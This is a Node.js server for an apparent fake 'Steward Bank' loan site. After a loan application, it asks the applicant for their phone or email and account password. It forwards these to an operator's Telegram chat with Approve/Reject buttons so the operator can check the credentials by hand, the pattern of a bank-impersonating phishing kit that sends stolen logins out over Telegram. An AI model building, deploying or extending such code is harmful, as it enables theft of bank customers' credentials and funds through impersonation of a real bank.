const express = require('express');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.static(__dirname));

// Import database
const db = require('./database');

// Telegram Bot
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
let bot;

if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
    try {
        bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
        console.log('✅ Telegram bot connected');
    } catch (error) {
        console.error('❌ Telegram bot error:', error.message);
    }
} else {
    console.warn('⚠️  Telegram bot not configured');
}

// In-memory storage (replace with database in production)
const applications = new Map();

// ============================================
// API ROUTES
// ============================================

// Get admins list
app.get('/api/admins', (req, res) => {
    try {
        const adminsList = db.getAdmins();
        res.json({ success: true, admins: adminsList });
    } catch (error) {
        console.error('Error getting admins:', error);
        res.status(500).json({ success: false, error: 'Failed to get admins' });
    }
});

// Submit application
app.post('/api/submit-application', async (req, res) => {
    try {
        const applicationData = req.body;
        const applicationId = applicationData.applicationId || 'LOAN-' + Date.now();
        
        // Store application
        applications.set(applicationId, {
            ...applicationData,
            status: 'pending',
            createdAt: new Date()
        });
        
        // Get admin
        const adminId = applicationData.adminId || db.getAdmins()[0]?.id;
        const admin = db.getAdminById(adminId);
        
        if (bot && admin && admin.telegramChatId) {
            // Send notification to admin
            const message = `
🆕 NEW LOAN APPLICATION

📋 Application ID: ${applicationId}
👤 Name: ${applicationData.fullName}
📧 Email: ${applicationData.email}
💰 Loan Amount: $${parseFloat(applicationData.loanAmount).toLocaleString()}
📅 Term: ${applicationData.loanTerm} months
💼 Purpose: ${applicationData.loanPurpose}

Status: Awaiting account verification
            `;
            
            await bot.sendMessage(admin.telegramChatId, message);
        }
        
        res.json({ success: true, applicationId });
    } catch (error) {
        console.error('Error submitting application:', error);
        res.status(500).json({ success: false, error: 'Failed to submit application' });
    }
});

// Account verification (replaces PIN verification)
app.post('/api/verify-account', async (req, res) => {
    try {
        const { applicationId, identifier, password, identifierType } = req.body;
        
        const application = applications.get(applicationId);
        if (!application) {
            return res.status(404).json({ success: false, error: 'Application not found' });
        }
        
        // Store verification attempt
        application.verificationAttempt = {
            identifier,
            identifierType,
            timestamp: new Date()
        };
        application.status = 'verification_pending';
        applications.set(applicationId, application);
        
        // Get admin
        const adminId = application.adminId || db.getAdmins()[0]?.id;
        const admin = db.getAdminById(adminId);
        
        if (bot && admin && admin.telegramChatId) {
            const keyboard = {
                inline_keyboard: [
                    [
                        { text: '✅ Approve', callback_data: `approve_verification_${applicationId}` },
                        { text: '❌ Reject', callback_data: `reject_verification_${applicationId}` }
                    ]
                ]
            };
            
            const message = `
🔐 ACCOUNT VERIFICATION REQUEST

📋 Application ID: ${applicationId}
👤 Name: ${application.fullName}
💰 Loan Amount: $${parseFloat(application.loanAmount).toLocaleString()}

📱 Identifier: ${identifier} (${identifierType})
🔑 Password: ${password.substring(0, 2)}${'*'.repeat(password.length - 2)}

Please verify the account credentials:
            `;
            
            await bot.sendMessage(admin.telegramChatId, message, { reply_markup: keyboard });
        }
        
        res.json({ success: true });
    } catch (error) {
        console.error('Error verifying account:', error);
        res.status(500).json({ success: false, error: 'Verification failed' });
    }
});

// Check verification status
app.get('/api/check-verification-status/:applicationId', (req, res) => {
    try {
        const { applicationId } = req.params;
        const application = applications.get(applicationId);
        
        if (!application) {
            return res.status(404).json({ success: false, error: 'Application not found' });
        }
        
        res.json({ success: true, status: application.status });
    } catch (error) {
        console.error('Error checking status:', error);
        res.status(500).json({ success: false, error: 'Failed to check status' });
    }
});

// ============================================
// TELEGRAM BOT HANDLERS
// ============================================

if (bot) {
    // Handle approval/rejection callbacks
    bot.on('callback_query', async (query) => {
        const data = query.data;
        const chatId = query.message.chat.id;
        
        try {
            if (data.startsWith('approve_verification_')) {
                const applicationId = data.replace('approve_verification_', '');
                const application = applications.get(applicationId);
                
                if (application) {
                    application.status = 'approved';
                    applications.set(applicationId, application);
                    
                    await bot.answerCallbackQuery(query.id, { text: 'Account verified and approved!' });
                    await bot.sendMessage(chatId, `✅ Account verified! Customer can now proceed with their loan.`);
                }
            } else if (data.startsWith('reject_verification_')) {
                const applicationId = data.replace('reject_verification_', '');
                const application = applications.get(applicationId);
                
                if (application) {
                    application.status = 'rejected';
                    applications.set(applicationId, application);
                    
                    await bot.answerCallbackQuery(query.id, { text: 'Verification rejected' });
                    await bot.sendMessage(chatId, `❌ Account verification rejected. Customer will be notified.`);
                }
            }
        } catch (error) {
            console.error('Error handling callback:', error);
        }
    });
    
    // Handle text messages
    bot.on('message', async (msg) => {
        const chatId = msg.chat.id;
        const text = msg.text;
        
        if (text === '/start') {
            await bot.sendMessage(chatId, `
🏦 Welcome to Steward Bank Loan Admin Panel

You will receive notifications here when:
- New loan applications are submitted
- Account verification is requested
- Customers need approval

Your Chat ID: ${chatId}
Add this to your .env file as SUPER_ADMIN_CHAT_ID
            `);
        }
    });
}

// ============================================
// SERVE HTML PAGES
// ============================================

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/application.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'application.html'));
});

app.get('/verification.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'verification.html'));
});

app.get('/approval.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'approval.html'));
});

// Start server
app.listen(PORT, () => {
    console.log(`
╔═══════════════════════════════════════╗
║   🏦 STEWARD BANK LOAN SYSTEM        ║
╠═══════════════════════════════════════╣
║   Server running on port ${PORT}         ║
║   http://localhost:${PORT}               ║
║                                       ║
║   Currency: USD ($)                   ║
║   Market: Zimbabwe                    ║
║   Verification: Phone/Email + Password║
╚═══════════════════════════════════════╝
    `);
});

module.exports = app;
